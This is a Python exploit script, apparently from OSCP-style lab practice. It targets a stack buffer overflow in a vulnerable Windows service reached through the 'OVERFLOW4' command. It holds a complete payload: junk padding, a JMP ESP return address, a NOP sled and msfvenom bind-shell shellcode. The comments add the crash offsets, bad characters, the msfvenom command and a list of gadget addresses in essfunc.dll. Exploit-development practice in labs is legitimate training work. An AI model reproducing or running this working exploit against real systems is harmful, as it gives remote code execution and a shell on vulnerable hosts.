import socket
import time


# Fuzzing shows crash at 2100 bytes input

host = "10.10.5.232"
port = 1337

offset = 2026
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xbe\x27\x63\xa1\xcc\xdb\xd1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
    b"\x53\x31\x75\x12\x03\x75\x12\x83\xe2\x67\x43\x39\x10\x8f\x01"
    b"\xc2\xe8\x50\x66\x4a\x0d\x61\xa6\x28\x46\xd2\x16\x3a\x0a\xdf"
    b"\xdd\x6e\xbe\x54\x93\xa6\xb1\xdd\x1e\x91\xfc\xde\x33\xe1\x9f"
    b"\x5c\x4e\x36\x7f\x5c\x81\x4b\x7e\x99\xfc\xa6\xd2\x72\x8a\x15"
    b"\xc2\xf7\xc6\xa5\x69\x4b\xc6\xad\x8e\x1c\xe9\x9c\x01\x16\xb0"
    b"\x3e\xa0\xfb\xc8\x76\xba\x18\xf4\xc1\x31\xea\x82\xd3\x93\x22"
    b"\x6a\x7f\xda\x8a\x99\x81\x1b\x2c\x42\xf4\x55\x4e\xff\x0f\xa2"
    b"\x2c\xdb\x9a\x30\x96\xa8\x3d\x9c\x26\x7c\xdb\x57\x24\xc9\xaf"
    b"\x3f\x29\xcc\x7c\x34\x55\x45\x83\x9a\xdf\x1d\xa0\x3e\xbb\xc6"
    b"\xc9\x67\x61\xa8\xf6\x77\xca\x15\x53\xfc\xe7\x42\xee\x5f\x60"
    b"\xa6\xc3\x5f\x70\xa0\x54\x2c\x42\x6f\xcf\xba\xee\xf8\xc9\x3d"
    b"\x10\xd3\xae\xd1\xef\xdc\xce\xf8\x2b\x88\x9e\x92\x9a\xb1\x74"
    b"\x62\x22\x64\xe0\x6a\x85\xd7\x17\x97\x75\x88\x97\x37\x1e\xc2"
    b"\x17\x68\x3e\xed\xfd\x01\xd7\x10\xfe\x3c\x74\x9c\x18\x54\x94"
    b"\xc8\xb3\xc0\x56\x2f\x0c\x77\xa8\x05\x24\x1f\xe1\x4f\xf3\x20"
    b"\xf2\x45\x53\xb6\x79\x8a\x67\xa7\x7d\x87\xcf\xb0\xea\x5d\x9e"
    b"\xf3\x8b\x62\x8b\x63\x2f\xf0\x50\x73\x26\xe9\xce\x24\x6f\xdf"
    b"\x06\xa0\x9d\x46\xb1\xd6\x5f\x1e\xfa\x52\x84\xe3\x05\x5b\x49"
    b"\x5f\x22\x4b\x97\x60\x6e\x3f\x47\x37\x38\xe9\x21\xe1\x8a\x43"
    b"\xf8\x5e\x45\x03\x7d\xad\x56\x55\x82\xf8\x20\xb9\x33\x55\x75"
    b"\xc6\xfc\x31\x71\xbf\xe0\xa1\x7e\x6a\xa1\xd2\x34\x36\x80\x7a"
    b"\x91\xa3\x90\xe6\x22\x1e\xd6\x1e\xa1\xaa\xa7\xe4\xb9\xdf\xa2"
    b"\xa1\x7d\x0c\xdf\xba\xeb\x32\x4c\xba\x39"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW4 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 70433570
# ESP at crash: 018DFA30 -> 37704336


# EIP Pattern Offset: 2026
# ESP (0x018dfa30) points at offset 2030

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0xa9, 0xcd, 0xd4

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\xa9\xcd\xd4'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

